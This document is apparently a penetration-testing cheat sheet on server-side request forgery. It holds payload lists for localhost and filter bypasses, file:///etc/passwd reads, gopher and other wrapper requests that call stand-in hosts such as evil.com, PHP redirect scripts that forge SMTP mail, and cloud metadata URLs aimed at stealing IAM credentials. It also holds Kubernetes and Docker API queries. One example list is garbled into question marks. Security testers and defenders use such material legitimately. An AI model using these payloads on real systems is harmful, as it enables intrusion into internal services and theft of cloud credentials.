# Server-Side Request Forgery

Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

Tools:

- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

## Summary

* [Exploit with localhost](#exploit-with-localhost)
* [Bypassing filters](#bypassing-filters)
* [SSRF via URL Scheme](#ssrf-via-url-scheme)
* [SSRF to XSS](#ssrf-to-xss-by-d0rkerdevil--alyssaoherrera)
* [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
  * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
  * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
  * [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
  * [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
  * [SSRF URL for Azure](#ssrf-url-for-azure)
  * [SSRF URL for OpenStack/RackSpace](#ssrf-url-for-openstackrackspace)
  * [SSRF URL for HP Helion](#ssrf-url-for-hp-helion)
  * [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
  * [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
  * [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
  * [SSRF URL for Docker](#ssrf-url-for-docker)
  * [SSRF URL for Rancher](#ssrf-url-for-rancher)

## Exploit with localhost

Basic SSRF v1

```powershell
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
```

Basic SSRF - Alternative version

```powershell
http://localhost:80
http://localhost:443
http://localhost:22
```

Advanced exploit using a redirection

```powershell
1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
```

Advanced exploit using type=url

```powershell
Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF
```

## Bypassing filters

Bypass using HTTPS

```powershell
https://127.0.0.1/
https://localhost/
```

Bypass localhost with [::]

```powershell
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

```powershell
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
```

Bypass localhost with a domain redirecting to locahost

```powershell
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
```

The service nip.io is awesome for that, it will convert any ip address as a dns.

```powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

Bypass localhost with CIDR : 127.x.x.x

```powershell
it's a /8
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

Bypass using a decimal ip location

```powershell
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
```

Bypass using malformed urls

```powershell
localhost:+11211aaa
localhost:00011211aaaa
```

Bypass using rare address

```powershell
http://0/
```

Bypass using bash variables (curl only)

```powershell
curl -v "http://evil$google.com"
$google = ""
```

Bypass using tricks combination

```powershell
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

Bypass using enclosed alphanumerics [@EdOverflow](https://twitter.com/EdOverflow)

```powershell
http://?????????????????????.????????? = example.com

List:
??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ??? ???
```

Bypass against a weak parser - by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/SSRF_Parser.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/WeakParser.jpg)


## SSRF via URL Scheme

File Wrapper

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

Dict Wrapper
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

Sftp Wrapper

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

Tftp Wrapper

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

Ldap Wrapper

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

Gopher Wrapper

```powershell
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a

will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH

You didn't say the magic word !


.
QUIT
```

Gopher SMTP - Back connect to 1337

```php
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```

Gopher SMTP - send a mail

```php
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

## SSRF to XSS by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)

```bash
http://brutelogic.com.br/poc.svg -> simple alert
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
```

## SSRF URL for Cloud Instances

### SSRF URL for AWS Bucket

[Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
Interesting path to look for at `http://169.254.169.254`

```powershell
Always here : /latest/meta-data/{hostname,public-ipv4,...}
User data (startup script for auto-scaling) : /latest/user-data
Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
```

DNS record

```powershell
http://169.254.169.254
http://metadata.nicob.net/
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io/
http://www.owasp.org.1ynrnhl.xip.io/
```

HTTP redirect

```powershell
Static:http://nicob.net/redir6a
Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
```

Alternate IP encoding

```powershell
http://425.510.425.510/ Dotted decimal with overflow
http://2852039166/ Dotless decimal
http://7147006462/ Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
http://0xA9FEA9FE/ Dotless hexadecimal
http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
http://0251.0376.0251.0376/ Dotted octal
http://0251.00376.000251.0000376/ Dotted octal with padding
```

More urls to include

```powershell
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
```

### SSRF URL for Google Cloud

Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Google allows recursive pulls

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

### SSRF URL for Digital Ocean

Documentation available at `https://developers.digitalocean.com/documentation/metadata/`

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

### SSRF URL for Packetcloud

Documentation available at `https://metadata.packet.net/userdata`

### SSRF URL for Azure

Limited, maybe more exists? `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

Update Apr 2017, Azure has more support; requires the header "Metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

### SSRF URL for OpenStack/RackSpace

(header required? unknown)

```powershell
http://169.254.169.254/openstack
```

### SSRF URL for HP Helion

(header required? unknown)

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

### SSRF URL for Oracle Cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

### SSRF URL for Alibaba

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

### SSRF URL for Kubernetes ETCD

Can contain API keys and internal ip and ports

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

### SSRF URL for Docker

```powershell
http://127.0.0.1:2375/v1.24/containers/json

Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

### SSRF URL for Rancher

```powershell
curl http://rancher-metadata/<version>/<path>
```

More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/

## Examples

- [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857)
- [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
- [SSRF in proxy.duckduckgo.com](https://hackerone.com/reports/358119)
- [Blind SSRF on errors.hackerone.net](https://hackerone.com/reports/374737)
- [SSRF on *shopifycloud.com](https://hackerone.com/reports/382612)

## Thanks to

- [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai](https://www.youtube.com/watch?v=D1S-G8rJrEk)
- [SSRF Tips - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
- [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
- [Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat](https://www.dailysecurity.fr/server-side-request-forgery/)
- [AppSecEU15 Server side browsing considered harmful - @Agarri](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
- [Enclosed alphanumerics - @EdOverflow](https://twitter.com/EdOverflow)
- [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity](http://www.sxcurity.pro/2017/12/17/hackertarget/)
- [PHP SSRF @secjuice](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
- [How I convert SSRF to xss in a ssrf vulnerable Jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
- [Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
- [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
